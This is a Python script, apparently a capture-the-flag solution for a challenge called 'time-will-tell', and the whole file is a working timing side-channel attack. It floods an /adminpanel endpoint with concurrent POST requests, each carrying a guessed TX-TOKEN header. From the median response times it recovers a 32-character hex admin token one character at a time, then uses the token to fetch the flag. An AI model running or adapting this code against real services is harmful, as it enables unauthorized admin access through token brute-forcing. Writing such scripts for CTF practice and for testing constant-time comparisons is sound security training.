import asyncio
import aiohttp
import time
import statistics
from operator import itemgetter
import requests
from colorama import Fore, Style, init
from tqdm import tqdm
import sys

# Initialize colorama
init(autoreset=True)

# Configuration
if len(sys.argv) != 2 or sys.argv[1] not in ["local", "docker", "remote"]:
    print("Usage: python3 solve.py [local/docker/remote]")
    sys.exit(1)

if sys.argv[1].lower() == "local":
    ADMIN_URL = "http://localhost:8000/adminpanel"
elif sys.argv[1].lower() == "docker":
    ADMIN_URL = "http://172.17.0.2:8000/adminpanel"  
elif sys.argv[1].lower() == "remote":
    ADMIN_URL = "https://hack-dearborn-3-ctf-time-will-tell.chals.io/adminpanel"

N = 3  # Number of measurements per guess (increase for accuracy)
TOKEN_SIZE = 32  # Length of the token to recover
HEX_CHARS = "0123456789abcdef"  # Possible characters in the token
MAX_CONCURRENT_REQUESTS = 256  # Maximum number of concurrent requests

class PasswordFound(Exception):
    """Custom exception to signal when the password/token is found."""
    def __init__(self, password):
        self.password = password

# Global request counter
request_count = 0

async def async_timing_attack(session, guess, semaphore):
    """
    Sends multiple POST requests with the given guess and records the response times.

    Args:
        session (aiohttp.ClientSession): The HTTP session for making requests.
        guess (str): The current token guess.
        semaphore (asyncio.Semaphore): Semaphore to limit concurrent requests.

    Returns:
        list: A list of response times for the given guess.
    """
    global request_count
    timings = []

    async with semaphore:
        for _ in range(N):
            try:
                start = time.perf_counter()
                async with session.post(ADMIN_URL, headers={'TX-TOKEN': guess, "Content-Type": "application/json"}, json={}) as resp:
                    end = time.perf_counter()
                    request_count += 1
                    if resp.status == 200:
                        raise PasswordFound(guess)
                    elif resp.status != 403:
                        print(Fore.RED + f"Unexpected status code: {resp.status}")
                        continue
                    timings.append(end - start)
            except aiohttp.ClientConnectionError as e:
                print(Fore.YELLOW + f"Connection error: {e}. Retrying...")
                # Optionally, implement retry logic here
                continue

    return timings

async def find_next_character(base, semaphore, session):
    """
    Determines the next character in the token by measuring response times.

    Args:
        base (str): The current known prefix of the token.
        semaphore (asyncio.Semaphore): Semaphore to limit concurrent requests.
        session (aiohttp.ClientSession): The HTTP session for making requests.

    Returns:
        str: The most likely next character in the token.
    """
    measures = []
    tasks = []

    for character in HEX_CHARS:
        # Create a guess by appending the current character and padding the rest with '0's
        guess = base + character + "0" * (TOKEN_SIZE - len(base) - 1)
        task = asyncio.create_task(async_timing_attack(session, guess, semaphore))
        tasks.append((character, task))

    for character, task in tasks:
        try:
            timings = await task
            if timings:
                median = statistics.median(timings)
                measures.append({'character': character, 'median': median})
        except PasswordFound as e:
            raise e

    if not measures:
        raise Exception("No timing data collected. Adjust N or check server configuration.")

    # Sort characters by median timing in descending order
    sorted_measures = sorted(measures, key=itemgetter('median'), reverse=True)
    found_character = sorted_measures[0]['character']

    # Calculate overall median for debugging purposes
    median_values = [m['median'] for m in sorted_measures]
    overall_median = statistics.median(median_values)
    print(Fore.YELLOW + f"Stats for token so far: {base} | Overall Median Timing: {overall_median:.6f} seconds")

    return found_character

async def main():
    """
    The main asynchronous function that orchestrates the timing attack.
    """
    base = ''
    semaphore = asyncio.Semaphore(MAX_CONCURRENT_REQUESTS)
    progress = tqdm(total=TOKEN_SIZE, desc="Cracking Token", unit="char")

    # Start time tracking
    attack_start_time = time.perf_counter()

    try:
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=MAX_CONCURRENT_REQUESTS)) as session:
            while len(base) < TOKEN_SIZE:
                next_char = await find_next_character(base, semaphore, session)
                base += next_char
                progress.update(1)
                progress.set_postfix({"Current Token": f"{base}"})
                print(Fore.GREEN + f"Found character: {next_char} | Token so far: {base}")

    except PasswordFound as e:
        # End time tracking upon finding the password
        attack_end_time = time.perf_counter()
        time_elapsed = attack_end_time - attack_start_time
        requests_per_second = request_count / time_elapsed if time_elapsed > 0 else float('inf')

        print(Fore.CYAN + f"\nThe token is: {e.password}")
        header = {'TX-TOKEN': e.password, "Content-Type": "application/json"}

        # Fetch the final flag
        try:
            r = requests.post(ADMIN_URL, headers=header, json={})
            if r.status_code == 200:
                print(Fore.BLUE + f"Flag: {r.json()['flag']}")
            else:
                print(Fore.RED + f"Error retrieving flag: Status code {r.status_code}")
        except requests.RequestException as e:
            print(Fore.RED + f"Failed to retrieve flag: {e}")

        # Calculate additional statistics
        print(Fore.MAGENTA + f"Total number of requests made: {request_count}")
        print(Fore.MAGENTA + f"Time elapsed: {time_elapsed:.2f} seconds")
        print(Fore.MAGENTA + f"Requests per second (RPS): {requests_per_second:.2f}")

    finally:
        progress.close()

        # If the attack wasn't successful, still print the stats
        if len(base) < TOKEN_SIZE:
            attack_end_time = time.perf_counter()
            time_elapsed = attack_end_time - attack_start_time
            requests_per_second = request_count / time_elapsed if time_elapsed > 0 else float('inf')

            print(Fore.MAGENTA + f"Total number of requests made: {request_count}")
            print(Fore.MAGENTA + f"Time elapsed: {time_elapsed:.2f} seconds")
            print(Fore.MAGENTA + f"Requests per second (RPS): {requests_per_second:.2f}")

if __name__ == '__main__':
    asyncio.run(main())
